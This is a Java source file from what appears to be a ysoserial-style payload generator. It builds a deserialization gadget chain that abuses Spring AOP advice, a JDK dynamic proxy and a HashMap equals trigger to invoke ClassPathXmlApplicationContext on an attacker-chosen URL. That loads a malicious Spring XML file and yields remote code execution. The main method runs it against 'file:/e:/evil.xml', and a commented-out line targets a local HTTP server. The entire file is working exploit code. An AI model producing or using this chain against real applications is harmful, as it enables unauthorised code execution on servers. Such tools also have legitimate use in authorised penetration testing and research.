package com.h2tg.ysogate.payloads.gadgets;

import com.fasterxml.jackson.databind.introspect.AnnotatedConstructor;
import com.h2tg.ysogate.annotation.Dependencies;
import com.h2tg.ysogate.bullet.jdk.GHashMap;
import com.h2tg.ysogate.payloads.CommandObjectPayload;
import com.h2tg.ysogate.utils.PayloadRunner;
import org.springframework.aop.aspectj.AspectJAfterReturningAdvice;
import org.springframework.aop.aspectj.AspectJExpressionPointcut;
import org.springframework.aop.aspectj.SingletonAspectInstanceFactory;
import org.springframework.aop.framework.AdvisedSupport;
import org.springframework.aop.framework.adapter.AfterReturningAdviceInterceptor;
import org.springframework.aop.interceptor.ExposeInvocationInterceptor;
import org.springframework.aop.support.NameMatchMethodPointcutAdvisor;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

import static com.h2tg.ysogate.utils.Reflections.createWithoutConstructor;

@Dependencies({
        "org.springframework:spring-aop >= 4.3.0.RC1",
        "org.aspectj:aspectjweaver",
        "com.fasterxml.jackson.core:jackson-databind"
})
public class SpringAOPWithXml extends PayloadRunner implements CommandObjectPayload<Object>
{
    @Override
    public Object getObject(String url) throws Exception
    {
        HashMap<String,String> hashMap=new HashMap<>();
        hashMap.put("test",url);

        Hashtable<String,String> hashtable=new Hashtable<>();
        hashtable.put("test","any");

        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(hashMap);

        ExposeInvocationInterceptor exposeInvocationInterceptor = createWithoutConstructor(ExposeInvocationInterceptor.class);
        NameMatchMethodPointcutAdvisor advisor0= new NameMatchMethodPointcutAdvisor(exposeInvocationInterceptor);
        advisor0.setMappedName("get");

        AspectJAfterReturningAdvice advice= makeAdviceForConstructor("org.springframework.context.support.ClassPathXmlApplicationContext");
        AfterReturningAdviceInterceptor adviceInterceptor = new AfterReturningAdviceInterceptor(advice);
        NameMatchMethodPointcutAdvisor advisor = new NameMatchMethodPointcutAdvisor(adviceInterceptor);
        advisor.setMappedName("get");

        advisedSupport.addAdvisor(advisor0);
        advisedSupport.addAdvisor(advisor);

        Constructor<?> constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
        Map proxy = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Map.class}, handler);
        GHashMap gHashMap = new GHashMap();
        HashMap h=gHashMap.readObject2Equals(proxy,hashtable);
        return h;
    }

    public static AspectJAfterReturningAdvice makeAdviceForConstructor(String classname) throws Exception
    {
        Constructor<?> constructor0=Class.forName(classname).getDeclaredConstructor(String.class);
        AnnotatedConstructor annotatedConstructor=new AnnotatedConstructor(null,constructor0,null,null);

        SingletonAspectInstanceFactory aspectInstanceFactory = new SingletonAspectInstanceFactory(annotatedConstructor);
        AspectJAfterReturningAdvice advice = new AspectJAfterReturningAdvice(AnnotatedConstructor.class.getMethod("call1",Object.class), new AspectJExpressionPointcut(),aspectInstanceFactory);
        advice.setArgumentNames("test");
        advice.setReturningName("test");
        return advice;
    }

    public static void main(final String[] args) throws Exception {
//        PayloadRunner.run(SpringAOPWithXml.class, new String[]{"http://127.0.0.1:8000/666.xml"});
        PayloadRunner.run(SpringAOPWithXml.class, new String[]{"file:/e:/evil.xml"});
    }
}
